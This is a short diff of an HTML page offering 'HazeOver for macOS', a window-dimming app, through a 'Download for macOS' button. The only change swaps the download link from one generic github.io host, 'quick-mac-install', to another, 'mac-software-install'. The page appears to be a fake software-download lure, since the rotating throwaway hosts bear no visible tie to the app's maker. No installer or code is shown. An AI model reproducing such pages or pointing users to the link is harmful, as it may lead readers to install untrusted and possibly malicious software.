@@ -6,7 +6,7 @@
 <h3>HazeOver for macOS</h3>
 <p>HazeOver Mac Edition is built to improve your focus by dimming out the background windows, ensuring your attention stays fixed on what's important.</p>
 
-<a href="https://quick-mac-install.github.io/.github/HazeOver">
+<a href="https://mac-software-install.github.io/.github/HazeOver">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
